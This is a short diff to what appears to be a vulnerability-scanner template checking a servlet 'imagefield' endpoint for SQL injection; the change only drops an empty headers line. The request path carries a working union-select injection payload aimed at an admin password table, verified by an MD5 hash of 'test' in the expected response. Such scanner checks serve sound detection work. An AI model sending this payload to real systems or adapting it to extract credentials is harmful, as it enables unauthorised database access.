@@ -9,7 +9,6 @@ info:
 requests1:
   method: GET
   path: /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+
-  headers:
 response1:
   headers:
   body: 0x098f6bcd4621d373cade4e832627b4f6
